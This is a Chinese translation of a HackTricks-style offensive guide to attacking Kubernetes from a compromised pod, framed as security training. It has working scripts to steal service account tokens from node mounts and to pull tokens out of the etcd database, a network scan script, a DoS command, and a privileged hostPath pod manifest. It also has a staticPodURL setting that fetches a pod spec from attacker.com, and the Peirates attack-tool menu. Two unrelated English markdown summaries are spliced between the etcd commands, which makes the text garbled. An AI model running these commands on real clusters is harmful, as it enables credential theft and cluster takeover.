# 从 Pod 内部攻击 Kubernetes

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) 上**关注**我。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## **Pod 逃逸**

**如果你足够幸运，你可能能够从中逃脱到节点：**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### 从 Pod 中逃脱

为了尝试从 Pod 中逃脱，您可能需要**提升权限**，一些可用的技术包括：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

您可以检查这些**Docker 逃逸**尝试逃脱已被攻破的 Pod：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### 滥用 Kubernetes 权限

如**kubernetes 枚举**部分所述：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常，Pod 是以其中的**服务账户令牌**运行的。该服务账户可能附有一些**权限**，您可以**滥用**这些权限**移动**到其他 Pod，甚至**逃脱**到集群内配置的节点。查看方法：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 滥用云权限

如果 Pod 在**云环境**中运行，您可能能够**从元数据端点泄漏令牌**并使用它提升权限。

## 搜索易受攻击的网络服务

由于您在 Kubernetes 环境中，如果无法通过滥用当前 Pod 的权限提升权限，也无法逃脱容器，您应该**搜索潜在的易受攻击服务。**

### 服务

**为此，您可以尝试获取 Kubernetes 环境中的所有服务：**
```
kubectl get svc --all-namespaces
```
默认情况下，Kubernetes使用平面网络架构，这意味着**集群中的任何pod/service都可以相互通信**。集群中的**命名空间**默认情况下**没有任何网络安全限制**。命名空间中的任何人都可以与其他命名空间通信。

### 扫描

以下Bash脚本（取自[Kubernetes workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)）将安装并扫描kubernetes集群的IP范围：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
查看以下页面，了解如何**攻击Kubernetes特定服务**以**危害其他Pod/整个环境**：

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### 嗅探

如果**被入侵的Pod正在运行一些敏感服务**，其他Pod需要进行身份验证，您可能能够通过**嗅探本地通信**来获取其他Pod发送的凭据。

## 网络欺骗

默认情况下，诸如**ARP欺骗**（以及由此引发的**DNS欺骗**）等技术在Kubernetes网络中起作用。然后，在Pod内部，如果您拥有**NET\_RAW功能**（默认情况下存在），您将能够发送自定义精心制作的网络数据包，并通过**ARP欺骗对运行在同一节点中的所有Pod执行中间人攻击**。\
此外，如果**恶意Pod**正在**与DNS服务器运行在同一节点**，您将能够对集群中的所有Pod执行**DNS欺骗攻击**。

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## 节点拒绝服务（DoS）

在Kubernetes清单中没有资源规范，且容器没有**应用限制**范围。作为攻击者，我们可以**消耗Pod/部署运行的所有资源**，使其他资源枯竭，并导致环境发生DoS。

可以使用诸如[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)之类的工具来执行此操作：
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
您可以在运行`stress-ng`时和之后看到差异
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## 节点后渗透

如果你成功**逃离容器**，在节点中你会发现一些有趣的东西：

- **容器运行时**进程（Docker）
- 在节点上运行的更多**pod/容器**，你可以像这个一样滥用（更多令牌）
- 整个**文件系统**和**操作系统**一般情况
- **Kube-Proxy** 服务正在监听
- **Kubelet** 服务正在监听。检查配置文件：
  - 目录：`/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- 其他**Kubernetes常见文件**：
  - `$HOME/.kube/config` - **用户配置**
  - `/etc/kubernetes/kubelet.conf`- **常规配置**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **引导配置**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd 配置**
  - `/etc/kubernetes/pki` - **Kubernetes 密钥**

### 查找节点 kubeconfig

如果你在之前注释的路径中找不到 kubeconfig 文件，请检查 kubelet 进程的参数 `--kubeconfig`：
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### 窃取机密
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
脚本 [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) 将自动获取其他 pod 的令牌，并检查它们是否具有您正在寻找的权限（而不是您逐个查看）。
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特权 DaemonSets

一个 DaemonSet 是一个**pod**，将在**集群中的所有节点上运行**。因此，如果一个 DaemonSet 配置了一个**特权服务账户**，在**所有节点**中你将能够找到那个**特权服务账户**的**令牌**，你可以滥用它。

这个漏洞与前一节中的相同，但现在你不再依赖运气。

### 切换到云端

如果集群由云服务管理，通常**节点**将有不同的访问**元数据**端点的权限，与 Pod 不同。因此，尝试从节点（或从 hostNetwork 为 True 的 pod）**访问元数据端点**：

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### 窃取 etcd

如果你可以指定将运行容器的节点的[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)，在控制平面节点内获取一个 shell 并获取**etcd 数据库**：
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane节点具有**主节点角色**，在**云托管集群中，您将无法在其中运行任何内容**。

#### 从etcd中读取机密

如果您可以使用pod规范中的`nodeName`选择器在控制平面节点上运行您的pod，那么您可能很容易访问包含集群所有配置（包括所有机密）的`etcd`数据库。

以下是从正在运行在您所在的控制平面节点上的`etcd`中获取机密的一种快速而简单的方法。如果您想要一个更优雅的解决方案，可以使用带有`etcd`客户端实用程序`etcdctl`的pod，并使用控制平面节点的凭据连接到`etcd`，无论它在何处运行，请查看@mauilion的[此示例清单](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)。

**检查`etcd`是否在控制平面节点上运行，并查看数据库所在位置（这是在使用`kubeadm`创建的集群上）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

In a Kubernetes cluster, if an attacker gains access to a pod, they can potentially escalate their privileges to gain control over the entire cluster. This guide explores various techniques that attackers can use to move laterally within a Kubernetes cluster and escalate their privileges.

### Techniques for Escalating Privileges

#### 1. Accessing the Kubernetes API Server

Attackers can access the Kubernetes API server from inside a compromised pod. This can allow them to interact with the API server and perform actions such as creating new pods, deploying malicious applications, or deleting existing resources.

#### 2. Exploiting Service Accounts

Service accounts are used by pods to authenticate and interact with the Kubernetes API server. Attackers can exploit misconfigured service accounts to gain additional privileges within the cluster.

#### 3. Mounting Host Paths

By mounting host paths into a pod, attackers can access sensitive host resources such as configuration files, binaries, or other pods running on the same node. This can lead to further privilege escalation within the cluster.

### Conclusion

Securing pods within a Kubernetes cluster is crucial to prevent attackers from moving laterally and escalating their privileges. By understanding these techniques, security teams can better protect their Kubernetes environments from internal threats.
```
```bash
data-dir=/var/lib/etcd
```
**查看 etcd 数据库中的数据：**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**从数据库中提取令牌并显示服务账户名称**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**相同命令，但添加一些grep命令以仅返回kube-system命名空间中的默认令牌**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section covers various techniques that an attacker can use to escalate privileges and move laterally within the Kubernetes cluster.

### Escalating Privileges

#### Exploiting Kubernetes Service Account Tokens

Kubernetes pods use service account tokens to authenticate with the API server. If an attacker gains access to a pod, they can potentially access the service account token mounted within the pod. This token can be used to interact with the Kubernetes API and perform actions based on the permissions associated with the service account.

#### Accessing the Kubernetes API Server

Once an attacker has a valid service account token, they can interact with the Kubernetes API server. This access can be used to gather information about the cluster, create or delete resources, and perform other administrative actions.

### Moving Laterally

#### Accessing Other Pods

With access to the Kubernetes API server, an attacker can discover and access other pods within the cluster. This lateral movement allows the attacker to compromise additional pods and potentially gain access to more sensitive information or resources.

#### Exploiting Misconfigured RBAC Policies

If the cluster has misconfigured Role-Based Access Control (RBAC) policies, an attacker can exploit these misconfigurations to escalate privileges and access resources they should not be able to interact with. This can lead to further compromise of the cluster's security.

### Conclusion

Gaining access to a Kubernetes pod can be a critical security issue, as it provides attackers with a foothold to escalate privileges and move laterally within the cluster. It is essential for organizations to secure their Kubernetes clusters properly to prevent such attacks.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### 静态/镜像化Pod持久性

_静态Pod_由特定节点上的kubelet守护程序直接管理，而无需API服务器观察它们。与由控制平面管理的Pod（例如，部署）不同；**kubelet会监视每个静态Pod**（如果失败，则重新启动）。

因此，静态Pod始终**绑定到特定节点上的一个Kubelet**。

**kubelet会自动尝试为每个静态Pod在Kubernetes API服务器上创建一个镜像Pod**。这意味着在节点上运行的Pod在API服务器上可见，但无法从那里控制。Pod名称将以节点主机名作为后缀，并带有一个前导连字符。

{% hint style="danger" %}
静态Pod的**`spec`不能引用其他API对象**（例如，ServiceAccount，ConfigMap，Secret等。因此，**无法利用此行为启动具有任意ServiceAccount的Pod**以危害集群。但您可以使用此功能在不同命名空间中运行Pod（如果出于某种原因有用）。
{% endhint %}

如果您在节点主机内部，可以让其创建一个**静态Pod在自身内部**。这非常有用，因为这可能允许您在**不同命名空间**（如**kube-system**）中创建一个Pod。

要创建静态Pod，[**文档是一个很好的帮助**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。您基本上需要2件事：

* 在**kubelet服务**中配置参数**`--pod-manifest-path=/etc/kubernetes/manifests`**，或在**kubelet配置**中（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）并重新启动服务
* 在**`/etc/kubernetes/manifests`**中的**pod定义**中创建定义

**另一种更隐蔽的方法是：**

* 修改**kubelet**配置文件中的参数**`staticPodURL`**，设置类似`staticPodURL: http://attacker.com:8765/pod.yaml`。这将使kubelet进程从指定的URL获取**配置来创建静态Pod**。

**示例**的**pod**配置，用于在**kube-system**中创建一个特权pod，取自[**这里**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### 删除 pods + 无法调度的节点

如果攻击者已经**入侵了一个节点**，并且可以从其他节点**删除 pods**，并且**使其他节点无法执行 pods**，那么 pods 将在受损节点上重新运行，他将能够**窃取 tokens** 并在其中运行。\
有关[**更多信息，请访问此链接**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)。

## 自动化工具

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
